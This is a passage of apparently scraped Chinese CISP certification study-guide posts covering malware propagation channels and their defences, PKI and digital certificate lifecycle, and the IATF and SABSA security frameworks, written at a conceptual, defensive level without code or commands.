典型传播场景： 传播方式 伪装形式 诱导话术 危害 文件传播 照片.jpg.exe “看看这张照片” 木马植入 链接传播 短链接 “这个视频太搞笑了” 钓鱼网站 自动传播 无需伪装 无需话术 蠕虫扩散 二维码传播 二维码图片 “扫码领红包” 恶意应用 常见即时通讯平台： 即时通讯传播目标： ├── 个人通讯工具 │ ├── 微信&#x2F;WeChat │ ├── QQ │ ├── WhatsApp │ └── Telegram ├── 企业通讯工具 │ ├── 钉钉 │ ├── 企业微信 │ ├── Slack │ └── Microsoft Teams └── 传播特点 ├── 用户基数大 ├── 信任度高 ├── 传播速度快 └── 影响范围广 2.3 即时通讯传播防护 防护措施： 🛡️ 即时通讯安全防护用户层面： ✅ 提高警惕 不随意点击陌生链接 不下载可疑文件 验证发送者身份 注意异常行为 ✅ 安全设置 关闭自动下载功能 禁用不必要的权限 启用安全验证 定期更新软件 企业层面： 🏢 技术防护 部署即时通讯网关 文件类型过滤 链接安全检测 行为异常监控 🏢 管理措施 制定使用规范 安全意识培训 定期安全检查 应急响应机制 三、电子邮件传播 3.1 电子邮件传播方式 邮件传播的主要形式： graph TB A[\"电子邮件传播\"] B[\"附件传播\"] C[\"链接传播\"] D[\"HTML邮件\"] E[\"钓鱼邮件\"] A --> B A --> C A --> D A --> E B --> B1[\"可执行文件\"] B --> B2[\"Office文档宏\"] B --> B3[\"压缩包\"] C --> C1[\"恶意网站链接\"] C --> C2[\"钓鱼页面\"] C --> C3[\"下载链接\"] D --> D1[\"嵌入脚本\"] D --> D2[\"恶意图片\"] D --> D3[\"自动跳转\"] E --> E1[\"伪装官方邮件\"] E --> E2[\"紧急通知\"] E --> E3[\"中奖通知\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#ffebee,stroke:#d32f2f 邮件传播特点： 特点 说明 示例 伪装性强 模仿正规邮件 银行通知、快递单 针对性强 定向攻击 鱼叉式钓鱼 传播广泛 群发邮件 垃圾邮件 隐蔽性好 难以识别 社会工程学 3.2 电子邮件防护 防护策略： 邮件安全防护体系： ├── 网关层防护 │ ├── 反垃圾邮件网关 │ ├── 邮件过滤规则 │ ├── 附件类型限制 │ └── 病毒扫描 ├── 服务器层防护 │ ├── SPF验证 │ ├── DKIM签名 │ ├── DMARC策略 │ └── 邮件加密 ├── 客户端防护 │ ├── 禁用HTML邮件 │ ├── 禁用宏自动执行 │ ├── 防病毒软件 │ └── 安全插件 └── 用户层防护 ├── 识别钓鱼邮件 ├── 不点击可疑链接 ├── 不下载可疑附件 └── 验证发件人身份 四、网络蠕虫传播 4.1 蠕虫传播机制 蠕虫的自我复制和传播： graph TB A[\"蠕虫感染主机A\"] B[\"扫描网络\"] C[\"发现脆弱主机\"] D[\"利用漏洞入侵\"] E[\"植入蠕虫副本\"] F[\"继续传播\"] A --> B B --> C C --> D D --> E E --> F F --> B style A fill:#ffcdd2,stroke:#c62828 style D fill:#ff9800,stroke:#e65100 style E fill:#f44336,stroke:#b71c1c 蠕虫传播特点： 🚨 网络蠕虫的危害传播特点： ⚡ 自动传播 无需用户交互 自动扫描目标 自动利用漏洞 自我复制传播 🌐 传播迅速 指数级增长 短时间内大规模感染 难以控制 💥 破坏性强 消耗网络带宽 占用系统资源 可能携带其他恶意代码 造成大规模瘫痪 著名蠕虫案例： 蠕虫名称 时间 传播方式 影响 冲击波(Blaster) 2003 RPC漏洞 全球数百万台电脑 震荡波(Sasser) 2004 LSASS漏洞 导致系统重启 熊猫烧香 2006 多种方式 中国数百万台电脑 WannaCry 2017 EternalBlue漏洞 全球30万台电脑 4.2 蠕虫防护措施 综合防护策略： 防护层面 措施 说明 系统层 及时打补丁 修复已知漏洞 网络层 防火墙规则 限制不必要的端口 监控层 异常流量检测 发现扫描行为 隔离层 网络分段 限制传播范围 五、移动存储介质传播 5.1 U盘传播方式 U盘传播机制： graph LR A[\"感染的U盘\"] --> B[\"插入电脑\"] B --> C[\"自动运行\"] C --> D[\"感染系统\"] D --> E[\"感染其他U盘\"] E --> F[\"继续传播\"] style A fill:#ffcdd2,stroke:#c62828 style C fill:#ff9800,stroke:#e65100 style D fill:#f44336,stroke:#b71c1c 常见U盘病毒： U盘病毒类型： ├── 自动运行病毒 │ ├── 利用autorun.inf │ ├── 自动执行恶意程序 │ └── 感染所有驱动器 ├── 快捷方式病毒 │ ├── 隐藏真实文件 │ ├── 创建恶意快捷方式 │ └── 诱导用户点击 ├── 文件夹病毒 │ ├── 伪装成文件夹 │ ├── 隐藏真实文件夹 │ └── 双击即感染 └── 蠕虫病毒 ├── 自我复制 ├── 感染可执行文件 └── 通过U盘传播 5.2 移动介质防护 防护措施： 🛡️ U盘安全使用技术防护： ✅ 禁用自动运行 关闭autorun功能 手动浏览U盘内容 避免自动执行 ✅ 使用防病毒软件 插入前先扫描 实时监控 定期更新病毒库 ✅ 权限控制 限制U盘使用 白名单管理 审计日志记录 管理措施： 🏢 企业管理 制定U盘使用规范 发放专用U盘 定期安全检查 数据加密要求 六、网页挂马传播 6.1 网页挂马原理 挂马攻击流程： sequenceDiagram participant U as 用户 participant W as 被挂马网站 participant M as 恶意服务器 U->>W: 1. 访问网站 W->>U: 2. 返回含恶意代码的页面 U->>U: 3. 浏览器执行恶意脚本 U->>M: 4. 下载恶意程序 M->>U: 5. 返回恶意程序 U->>U: 6. 执行并感染系统 Note over U,M: 利用浏览器或插件漏洞 挂马方式： 方式 说明 特点 iframe挂马 嵌入隐藏框架 用户无感知 JavaScript挂马 恶意脚本 自动执行 Flash挂马 利用Flash漏洞 针对性强 0day挂马 利用未知漏洞 难以防御 6.2 网页挂马防护 防护策略： 网页挂马防护： ├── 浏览器安全 │ ├── 使用最新版本浏览器 │ ├── 及时更新插件 │ ├── 禁用不必要的插件 │ └── 启用安全警告 ├── 系统防护 │ ├── 安装防病毒软件 │ ├── 启用防火墙 │ ├── 及时打补丁 │ └── 使用标准用户权限 ├── 网络防护 │ ├── 部署Web过滤 │ ├── 使用安全DNS │ ├── 启用HTTPS │ └── 内容安全策略 └── 用户习惯 ├── 不访问可疑网站 ├── 注意浏览器警告 ├── 定期清理缓存 └── 使用安全搜索 七、社会工程学传播 7.1 社会工程学手法 常见诱骗手法： graph TB A[\"社会工程学攻击\"] B[\"利用好奇心\"] C[\"利用贪婪\"] D[\"利用恐惧\"] E[\"利用信任\"] A --> B A --> C A --> D A --> E B --> B1[\"神秘文件\"] B --> B2[\"八卦新闻\"] C --> C1[\"中奖通知\"] C --> C2[\"免费软件\"] D --> D1[\"账号被盗\"] D --> D2[\"法律威胁\"] E --> E1[\"伪装熟人\"] E --> E2[\"官方通知\"] style A fill:#f3e5f5,stroke:#7b1fa2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#ffebee,stroke:#c62828 style D fill:#ffcdd2,stroke:#b71c1c style E fill:#e3f2fd,stroke:#1976d2 7.2 社会工程学防护 防护要点： ⚠️ 识别社会工程学攻击警惕信号： 🚨 过于诱人的承诺 免费获得高价值物品 中奖、返利等 天上不会掉馅饼 🚨 制造紧迫感 限时优惠 账号即将被封 立即行动 🚨 要求提供敏感信息 密码、验证码 银行卡信息 身份证号码 🚨 来源可疑 陌生人发送 邮件地址异常 链接地址可疑 八、综合防护策略 8.1 多层防护体系 纵深防御架构： 恶意代码防护体系： ├── 边界防护 │ ├── 防火墙 │ ├── IPS&#x2F;IDS │ ├── 邮件网关 │ └── Web过滤 ├── 网络防护 │ ├── 网络分段 │ ├── 访问控制 │ ├── 流量监控 │ └── 异常检测 ├── 终端防护 │ ├── 防病毒软件 │ ├── 主机防火墙 │ ├── 应用白名单 │ └── 补丁管理 ├── 数据防护 │ ├── 数据加密 │ ├── 备份恢复 │ ├── 权限控制 │ └── DLP防护 └── 人员防护 ├── 安全意识培训 ├── 安全操作规范 ├── 定期安全提醒 └── 模拟演练 8.2 应急响应 恶意代码感染应急处理： 阶段 措施 说明 发现 识别感染迹象 异常行为、告警 隔离 断网隔离 防止扩散 分析 确定恶意代码类型 了解危害 清除 使用专杀工具 彻底清除 恢复 恢复系统和数据 验证安全性 总结 分析原因改进 防止再次发生 九、总结 恶意代码传播方式的核心要点： 即时通讯传播：利用信任关系，通过文件、链接、漏洞传播 电子邮件传播：附件、链接、钓鱼邮件是主要方式 网络蠕虫传播：自动扫描、利用漏洞、快速扩散 移动介质传播：U盘、移动硬盘等物理介质 网页挂马传播：利用浏览器和插件漏洞 社会工程学传播：利用人性弱点诱骗用户 🎯 关键要点 即时通讯传播包括文件、链接、漏洞利用三种方式 电子邮件是最传统但仍然有效的传播途径 网络蠕虫具有自动传播、速度快的特点 U盘等移动介质仍是重要传播途径 社会工程学利用人性弱点，难以技术防范 需要技术防护和安全意识培训相结合 多层防护体系是有效防御的关键 💡 防护建议个人用户： 提高安全意识，不轻信陌生信息 安装并更新防病毒软件 及时安装系统和软件补丁 谨慎使用U盘等移动介质 不访问可疑网站，不点击可疑链接 企业用户： 建立多层防护体系 部署专业安全设备 制定安全管理制度 定期开展安全培训 建立应急响应机制","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：PKI与数字证书","slug":"2025/10/CISP-PKI-Digital-Certificates-zh-CN","date":"un66fin66","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-PKI-Digital-Certificates/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-PKI-Digital-Certificates/","excerpt":"深入解析CISP认证中的公钥基础设施（PKI）和数字证书体系，涵盖CA、RA、证书生命周期管理等核心概念。","text":"公钥基础设施（Public Key Infrastructure, PKI）是支撑网络安全的重要基础设施，通过数字证书实现身份认证、数据加密和完整性保护。 一、PKI概述 1.1 什么是PKI 🔐 PKI定义**公钥基础设施（PKI）**是一套用于创建、管理、分发、使用、存储和撤销数字证书的策略、流程、服务器平台、软件和工作站的集合。 核心功能： 身份认证 数据加密 数字签名 完整性保护 不可否认性 1.2 PKI的重要性 为什么需要PKI： 🔒 解决公钥分发和验证问题 🆔 提供可信的身份认证 📝 支持数字签名和加密 🛡️ 保护网络通信安全 ⚖️ 提供法律效力支持 二、PKI核心组件 2.1 PKI体系架构 graph TB A[\"PKI体系架构\"] B[\"CA认证权威机构\"] C[\"RA注册权威机构\"] D[\"证书库\"] E[\"CRL库\"] F[\"终端实体用户\"] F -->|\"1. 提交申请\"| C C -->|\"2. 验证身份\"| C C -->|\"3. 转发请求\"| B B -->|\"4. 签发证书\"| B B -->|\"5. 发布证书\"| D B -->|\"6. 发布CRL\"| E D -->|\"7. 获取证书\"| F E -->|\"8. 查询撤销\"| F style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#ffcdd2,stroke:#c62828 style F fill:#f3e5f5,stroke:#7b1fa2 2.2 认证权威机构（CA） 🏛️ CA - 认证权威机构**Certificate Authority (CA)**是PKI的核心，负责签发和管理数字证书。 主要职责： 签发数字证书 撤销证书 发布证书撤销列表（CRL） 管理证书生命周期 维护证书库 CA的类型： CA类型 说明 示例 根CA 信任链的顶端 DigiCert Root CA 中间CA 由根CA签发 DigiCert Intermediate CA 签发CA 直接签发用户证书 企业内部CA CA的信任模型： 根CA（自签名） ├── 中间CA 1 │ ├── 签发CA 1-1 │ │ ├── 用户证书 │ │ └── 服务器证书 │ └── 签发CA 1-2 └── 中间CA 2 └── 签发CA 2-1 2.3 注册权威机构（RA） 📝 RA - 注册权威机构**Registration Authority (RA)**是CA的代理机构，负责处理证书申请和用户身份验证。 主要职责： 接收证书申请 验证用户身份 审核申请信息 转发请求给CA 处理证书撤销请求 RA在证书申请流程中的关键作用： sequenceDiagram participant U as 终端实体用户 participant R as RA注册权威机构 participant C as CA认证权威机构 participant D as 证书库 U->>R: 1. 提交证书申请 R->>R: 2. 验证用户身份 R->>R: 3. 审核申请信息 R->>C: 4. 转发合格申请 C->>C: 5. 签发数字证书 C->>D: 6. 发布证书 D->>U: 7. 用户获取证书 RA与CA的区别： 特征 RA CA 主要职责 身份验证和申请处理 证书签发和管理 权限 不能签发证书 可以签发证书 位置 可以分布式部署 通常集中管理 安全要求 较高 极高 私钥 不持有CA私钥 持有签名私钥 ⚠️ 关键区别RA不能签发证书！ RA只负责身份验证和申请处理 证书的签发必须由CA完成 RA是CA的&quot;前台&quot;，CA是&quot;后台&quot; 这种分离提高了安全性和可扩展性 2.4 证书库 📚 证书库**证书库（Certificate Repository）**存储已签发的数字证书，供用户查询和下载。 主要功能： 存储有效证书 提供证书查询服务 支持证书下载 维护证书索引 证书库的访问方式： 🌐 LDAP（轻量级目录访问协议） 🔍 HTTP/HTTPS查询接口 📡 OCSP（在线证书状态协议） 2.5 CRL库 🚫 CRL库**证书撤销列表库（CRL Repository）**存储已撤销证书的列表。 主要功能： 发布证书撤销列表 提供撤销状态查询 定期更新CRL 支持增量CRL CRL的内容： 字段 说明 证书序列号 被撤销证书的唯一标识 撤销时间 证书被撤销的时间 撤销原因 撤销的原因代码 签发者 CRL的签发者 下次更新时间 下一个CRL的发布时间 2.6 OCSP服务 🔍 OCSP - 在线证书状态协议**Online Certificate Status Protocol (OCSP)**提供实时的证书状态查询服务。 优势： 实时查询证书状态 响应速度快 减少带宽消耗 避免CRL过期问题 OCSP vs CRL： 特征 OCSP CRL 查询方式 实时在线查询 下载完整列表 响应速度 快 较慢 带宽消耗 小 大 隐私性 较低（暴露查询目标） 较高 可用性要求 高（需要在线服务） 低（可离线使用） 三、数字证书 3.1 数字证书的结构 X.509数字证书的主要字段： 数字证书结构： ├── 版本号 ├── 序列号 ├── 签名算法 ├── 签发者（CA） ├── 有效期 │ ├── 生效时间 │ └── 失效时间 ├── 主体（证书持有者） ├── 主体公钥信息 │ ├── 公钥算法 │ └── 公钥值 ├── 扩展字段 │ ├── 密钥用途 │ ├── 主体备用名称 │ └── CRL分发点 └── CA的数字签名 3.2 证书类型 常见的数字证书类型： 证书类型 用途 示例 服务器证书 网站HTTPS SSL/TLS证书 客户端证书 用户身份认证 个人数字证书 代码签名证书 软件签名 软件发布商证书 邮件证书 邮件加密和签名 S/MIME证书 设备证书 IoT设备认证 设备身份证书 3.3 证书验证 证书验证的步骤： graph TB A[\"证书验证\"] B[\"1. 验证证书签名\"] C[\"2. 检查有效期\"] D[\"3. 检查撤销状态\"] E[\"4. 验证信任链\"] F[\"5. 检查用途\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"使用CA公钥验证\"] C --> C1[\"当前时间在有效期内\"] D --> D1[\"查询CRL或OCSP\"] E --> E1[\"追溯到受信任的根CA\"] F --> F1[\"证书用途匹配\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#e1f5fe,stroke:#0277bd 四、证书生命周期管理 4.1 证书申请流程 完整的证书申请流程： graph TB A[\"1. 用户生成密钥对\"] B[\"2. 创建证书申请CSR\"] C[\"3. 提交申请到RA\"] D[\"4. RA验证身份\"] E[\"5. RA转发到CA\"] F[\"6. CA签发证书\"] G[\"7. 发布到证书库\"] H[\"8. 用户获取证书\"] A --> B B --> C C --> D D --> E E --> F F --> G G --> H style D fill:#e8f5e9,stroke:#388e3d style F fill:#e3f2fd,stroke:#1976d2 证书申请（CSR）包含的信息： 📝 主体信息（姓名、组织、国家等） 🔑 公钥 📧 联系信息 🔐 申请者的数字签名 4.2 证书更新 证书更新的场景： ⏰ 证书即将过期 🔄 密钥需要更换 📝 证书信息需要变更 🔒 加密算法升级 更新流程： 在证书过期前提交更新申请 RA验证身份（可能简化） CA签发新证书 用户安装新证书 旧证书到期后自动失效 4.3 证书撤销 🚫 证书撤销证书撤销是在证书有效期内使其失效的过程。 撤销原因： 私钥泄露或丢失 证书信息不准确 用户离职或权限变更 CA被攻破 证书不再需要 证书撤销流程： sequenceDiagram participant U as 用户/管理员 participant R as RA participant C as CA participant CRL as CRL库 participant O as OCSP服务 U->>R: 1. 提交撤销请求 R->>R: 2. 验证请求合法性 R->>C: 3. 转发撤销请求 C->>C: 4. 撤销证书 C->>CRL: 5. 更新CRL C->>O: 6. 更新OCSP Note over CRL,O: 证书状态已更新 撤销后的处理： 📋 证书序列号加入CRL 🔄 OCSP服务更新状态 🚫 证书不再被信任 ⚠️ 依赖方需要检查撤销状态 五、PKI应用场景 5.1 HTTPS/SSL/TLS Web安全通信： 🌐 网站身份认证 🔒 数据传输加密 🛡️ 防止中间人攻击 ✅ 数据完整性保护 5.2 电子邮件安全 S/MIME应用： 📧 邮件加密 ✍️ 数字签名 🔐 发件人身份认证 📝 邮件完整性保护 5.3 代码签名 软件安全： 💻 验证软件来源 ✅ 确保代码未被篡改 🛡️ 防止恶意软件 📦 应用商店分发 5.4 VPN和网络接入 网络安全： 🔐 用户身份认证 🌐 VPN连接建立 📡 无线网络认证（802.1X） 🔒 设备接入控制 六、PKI安全考虑 6.1 CA安全 保护CA的关键措施： 🔐 私钥离线存储（HSM） 🏢 物理安全控制 👥 多人授权机制 📋 严格的审计日志 🔄 定期安全评估 6.2 证书管理最佳实践 证书管理建议： 实践 说明 密钥长度 至少2048位RSA或256位ECC 有效期 不超过2年（公共证书） 撤销检查 始终验证证书撤销状态 私钥保护 使用HSM或安全存储 证书监控 监控证书过期和异常 6.3 常见安全威胁 PKI面临的威胁： 威胁 描述 防护措施 CA被攻破 攻击者获取CA私钥 离线存储、HSM保护 中间人攻击 伪造证书 证书固定、CT日志 私钥泄露 用户私钥被窃取 及时撤销、密钥保护 证书滥用 证书被用于非法用途 限制证书用途、监控 七、总结 PKI体系的核心要点： 核心组件：CA、RA、证书库、CRL库、OCSP RA的作用：在用户和CA之间，负责身份验证和申请处理 RA不能签发证书：只有CA才能签发证书 证书生命周期：申请、签发、使用、更新、撤销 撤销机制：CRL和OCSP两种方式 🎯 关键要点 PKI包含CA、RA、证书库、CRL库等核心组件 RA是CA的代理，负责身份验证，但不能签发证书 证书申请流程：用户→RA→CA→证书库→用户 证书撤销通过CRL或OCSP实现 证书验证包括签名、有效期、撤销状态、信任链等检查 💡 考试提示 记住RA在证书申请流程中的位置和作用 RA不能签发证书，只能验证身份和转发请求 理解证书库和CRL库的区别 掌握OCSP相对于CRL的优势 了解证书生命周期的各个阶段 相关资源： RFC 5280 - X.509证书标准 RFC 6960 - OCSP协议","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全保障框架（IATF与SABSA）","slug":"2025/10/CISP-Security-Frameworks-IATF-SABSA-zh-CN","date":"un66fin66","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Security-Frameworks-IATF-SABSA/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Security-Frameworks-IATF-SABSA/","excerpt":"深入解析CISP认证中的IATF和SABSA两大信息安全保障框架，理解深度防御和分层架构设计。","text":"信息安全保障框架为构建安全体系提供了系统化的方法论和指导原则。 一、IATF框架 1.1 IATF概述 IATF的定义： 🏛️ 什么是IATFIATF（Information Assurance Technical Framework）信息保障技术框架 由美国国家安全局（NSA）提出，是一个用于指导信息系统安全保障的综合性技术框架。 核心目标： 🎯 提供通用框架 对信息系统进行解构和描述 建立统一的安全保障视角 指导安全体系建设 🔒 讨论安全保障问题 基于框架讨论安全问题 识别安全需求 制定安全策略 1.2 IATF的四个焦点领域 💡 IATF框架的焦点领域由于信息系统的复杂性，因此需要一个通用的框架对其进行解构和描述，然后再基于此框架讨论信息系统的安全保护问题。 在IATF中，将信息系统的信息安全保障技术层面分为以下四个焦点领域： 本地的计算机环境 区域边界（即本地计算环境的外缘） 网络和基础设施 支持性基础设施 在深度防御技术方案中推荐多点防御原则和分层防御原则。 IATF的四个焦点领域： graph TB A[\"IATF四个焦点领域\"] B[\"本地计算环境Local Computing Environment\"] C[\"区域边界Enclave Boundaries\"] D[\"网络和基础设施Networks and Infrastructure\"] E[\"支持性基础设施Supporting Infrastructure\"] A --> B A --> C A --> D A --> E B --> B1[\"终端设备\"] B --> B2[\"操作系统\"] B --> B3[\"应用程序\"] C --> C1[\"防火墙\"] C --> C2[\"边界防护\"] C --> C3[\"访问控制\"] D --> D1[\"网络设备\"] D --> D2[\"通信链路\"] D --> D3[\"网络协议\"] E --> E1[\"PKI\"] E --> E2[\"目录服务\"] E --> E3[\"安全管理\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 四个焦点领域详解： IATF四个焦点领域： ├── 1. 本地计算环境（Local Computing Environment） │ ├── 定义：用户直接使用的计算资源 │ ├── 包括： │ │ ├── 工作站和服务器 │ │ ├── 操作系统 │ │ ├── 应用程序 │ │ └── 本地数据 │ └── 安全措施： │ ├── 主机加固 │ ├── 访问控制 │ ├── 病毒防护 │ └── 补丁管理 ├── 2. 区域边界（Enclave Boundaries） │ ├── 定义：本地计算环境的外缘 │ ├── 作用：隔离和保护内部环境 │ ├── 包括： │ │ ├── 防火墙 │ │ ├── 网关 │ │ ├── 代理服务器 │ │ └── VPN设备 │ └── 安全措施： │ ├── 边界防护 │ ├── 入侵检测 │ ├── 流量过滤 │ └── 访问控制 ├── 3. 网络和基础设施（Networks and Infrastructure） │ ├── 定义：连接各个计算环境的网络 │ ├── 包括： │ │ ├── 路由器和交换机 │ │ ├── 通信链路 │ │ ├── 网络协议 │ │ └── 传输介质 │ └── 安全措施： │ ├── 网络分段 │ ├── 加密传输 │ ├── 流量监控 │ └── 冗余设计 └── 4. 支持性基础设施（Supporting Infrastructure） ├── 定义：支持安全运行的基础服务 ├── 包括： │ ├── PKI（公钥基础设施） │ ├── 目录服务 │ ├── 安全管理平台 │ ├── 认证服务 │ └── 审计系统 └── 安全措施： ├── 密钥管理 ├── 证书管理 ├── 集中认证 └── 统一审计 1.3 深度防御原则 IATF推荐的两大防御原则： 🛡️ 深度防御原则1️⃣ 多点防御（Defense in Multiple Places） 在多个位置部署安全控制措施，形成多道防线。 特点： 在不同位置设置防御点 攻击者需要突破多个防御点 提高攻击难度和成本 增加检测和响应时间 2️⃣ 分层防御（Defense in Depth） 在不同层次部署安全控制措施，形成纵深防御。 特点： 在不同安全层次设置防御 层层防护，逐级深入 即使一层被突破，还有其他层保护 综合技术、管理、物理等多个维度 多点防御示意图： graph LR A[\"互联网\"] --> B[\"边界防火墙\"] B --> C[\"DMZ\"] C --> D[\"内部防火墙\"] D --> E[\"核心网络\"] E --> F[\"服务器\"] B --> B1[\"第1道防线\"] C --> C1[\"第2道防线\"] D --> D1[\"第3道防线\"] E --> E1[\"第4道防线\"] F --> F1[\"第5道防线\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#fff9c4,stroke:#f57f17 style E fill:#e8f5e9,stroke:#388e3d style F fill:#e3f2fd,stroke:#1976d2 分层防御示意图： graph TB A[\"分层防御体系\"] B[\"物理安全层\"] C[\"网络安全层\"] D[\"系统安全层\"] E[\"应用安全层\"] F[\"数据安全层\"] G[\"管理安全层\"] A --> B B --> C C --> D D --> E E --> F F --> G B --> B1[\"门禁、监控\"] C --> C1[\"防火墙、IDS\"] D --> D1[\"主机加固\"] E --> E1[\"应用防火墙\"] F --> F1[\"加密、备份\"] G --> G1[\"策略、流程\"] style B fill:#ffebee,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#fff9c4,stroke:#f57f17 style E fill:#e8f5e9,stroke:#388e3d style F fill:#e3f2fd,stroke:#1976d2 style G fill:#f3e5f5,stroke:#7b1fa2 多点防御 vs 分层防御： 特性 多点防御 分层防御 维度 水平/空间维度 垂直/层次维度 关注点 在多个位置设防 在多个层次设防 防御方式 多道防线 纵深防御 示例 边界防火墙、内部防火墙、主机防火墙 物理层、网络层、系统层、应用层 目标 增加攻击路径难度 增加攻击深度难度 效果 攻击者需要突破多个点 攻击者需要突破多个层 1.4 IATF的应用 基于IATF构建安全体系： IATF应用步骤： ├── 1. 系统分析 │ ├── 识别本地计算环境 │ ├── 确定区域边界 │ ├── 分析网络和基础设施 │ └── 评估支持性基础设施 ├── 2. 威胁分析 │ ├── 针对四个焦点领域 │ ├── 识别潜在威胁 │ ├── 评估威胁影响 │ └── 确定防护重点 ├── 3. 安全设计 │ ├── 应用多点防御原则 │ ├── 应用分层防御原则 │ ├── 设计安全控制措施 │ └── 制定安全策略 ├── 4. 实施部署 │ ├── 部署安全设备 │ ├── 配置安全策略 │ ├── 实施安全流程 │ └── 培训安全人员 └── 5. 持续改进 ├── 监控安全状态 ├── 评估安全效果 ├── 调整安全策略 └── 更新安全措施 二、SABSA模型 2.1 SABSA概述 SABSA的定义： 🏗️ 什么是SABSASABSA（Sherwood Applied Business Security Architecture） 谢伍德应用业务安全架构，是一个企业安全架构框架和方法论。 核心特点： 🎯 业务驱动 从业务需求出发 安全服务于业务 业务风险导向 🏗️ 分层架构 多层次的架构模型 从战略到实施 逐层细化 🔄 全生命周期 覆盖规划到运维 持续改进 动态调整 2.2 SABSA模型的层次 💡 SABSA模型的核心特征SABSA模型包括六层，它是一个分层模型。 关键特点： 🎯 业务驱动 第一层从安全的角度定义了业务需求 安全架构从业务需求出发 📊 逐层细化 模型的每一层抽象方式逐层减少，细节逐层增加 每个层级都是建立在其他层之上的 从策略逐渐到技术和解决方案的实施实践 🔗 完整链条 重新提出了一个包括战略、概念、设计、实施、度量和审计层次的安全链条 覆盖安全架构的全生命周期 SABSA的六层模型： graph TB A[\"SABSA六层模型\"] B[\"1. 战略层Contextual\"] C[\"2. 概念层Conceptual\"] D[\"3. 设计层Logical\"] E[\"4. 实施层Physical\"] F[\"5. 组件层Component\"] G[\"6. 运营层Operational\"] A --> B B --> C C --> D D --> E E --> F F --> G B --> B1[\"业务需求为什么\"] C --> C1[\"安全概念什么\"] D --> D1[\"安全架构如何\"] E --> E1[\"安全实施用什么\"] F --> F1[\"安全产品哪个\"] G --> G1[\"安全运营何时何地\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#fce4ec,stroke:#c2185b style G fill:#ffebee,stroke:#c62828 SABSA六层详解： SABSA六层模型详解： ├── 1. 战略层（Contextual Layer）- 业务需求 │ ├── 关键问题：为什么需要安全？ │ ├── 内容： │ │ ├── 业务目标和驱动因素 │ │ ├── 业务风险 │ │ ├── 安全目标 │ │ └── 业务需求 │ ├── 输出：业务安全需求 │ └── 抽象程度：最高 ├── 2. 概念层（Conceptual Layer）- 安全概念 │ ├── 关键问题：需要什么安全？ │ ├── 内容： │ │ ├── 安全策略 │ │ ├── 安全原则 │ │ ├── 安全服务 │ │ └── 安全概念模型 │ ├── 输出：安全策略和原则 │ └── 抽象程度：高 ├── 3. 设计层（Logical Layer）- 安全架构 │ ├── 关键问题：如何实现安全？ │ ├── 内容： │ │ ├── 安全架构设计 │ │ ├── 安全机制 │ │ ├── 安全流程 │ │ └── 逻辑模型 │ ├── 输出：安全架构设计 │ └── 抽象程度：中高 ├── 4. 实施层（Physical Layer）- 安全实施 │ ├── 关键问题：用什么实现？ │ ├── 内容： │ │ ├── 技术选型 │ │ ├── 产品选择 │ │ ├── 实施方案 │ │ └── 物理部署 │ ├── 输出：实施方案 │ └── 抽象程度：中低 ├── 5. 组件层（Component Layer）- 安全产品 │ ├── 关键问题：用哪个产品？ │ ├── 内容： │ │ ├── 具体产品 │ │ ├── 工具和技术 │ │ ├── 配置参数 │ │ └── 组件规格 │ ├── 输出：产品清单和配置 │ └── 抽象程度：低 └── 6. 运营层（Operational Layer）- 安全运营 ├── 关键问题：何时何地运营？ ├── 内容： │ ├── 运营流程 │ ├── 监控和维护 │ ├── 事件响应 │ └── 持续改进 ├── 输出：运营手册 └── 抽象程度：最低 2.3 SABSA的特点 SABSA模型的关键特点： ✨ SABSA模型特点1️⃣ 六层分层模型 从战略到运营 逐层细化 层层递进 2️⃣ 业务驱动 第一层定义业务需求 从业务角度看安全 安全服务于业务 3️⃣ 抽象递减，细节递增 上层抽象，下层具体 逐层增加细节 从&quot;为什么&quot;到&quot;如何做&quot; 4️⃣ 层层依赖 每层建立在上一层之上 上层指导下层 下层实现上层 5️⃣ 完整的安全链条 从战略到实施 从概念到运营 覆盖全生命周期 SABSA的六个视角（横向维度）： 除了六层纵向维度，SABSA还有六个横向视角： 视角 关键问题 关注点 资产 保护什么？ 需要保护的资产 动机 为什么保护？ 业务驱动因素 过程 如何保护？ 安全流程和机制 人员 谁来保护？ 角色和职责 位置 在哪里保护？ 物理和逻辑位置 时间 何时保护？ 时间和生命周期 2.4 SABSA矩阵 SABSA架构矩阵（6×6）： 📊 SABSA矩阵SABSA使用一个6×6的矩阵来组织安全架构： 纵向（6层）： 战略层 概念层 设计层 实施层 组件层 运营层 横向（6个视角）： 资产（What） 动机（Why） 过程（How） 人员（Who） 位置（Where） 时间（When） 矩阵的每个单元格回答一个具体问题，形成完整的安全架构。 示例：战略层的六个视角 视角 问题 内容 资产 保护什么业务资产？ 关键业务资产清单 动机 为什么需要保护？ 业务风险和驱动因素 过程 如何支持业务流程？ 关键业务流程 人员 谁是利益相关者？ 业务所有者、管理层 位置 业务在哪里开展？ 业务地点和范围 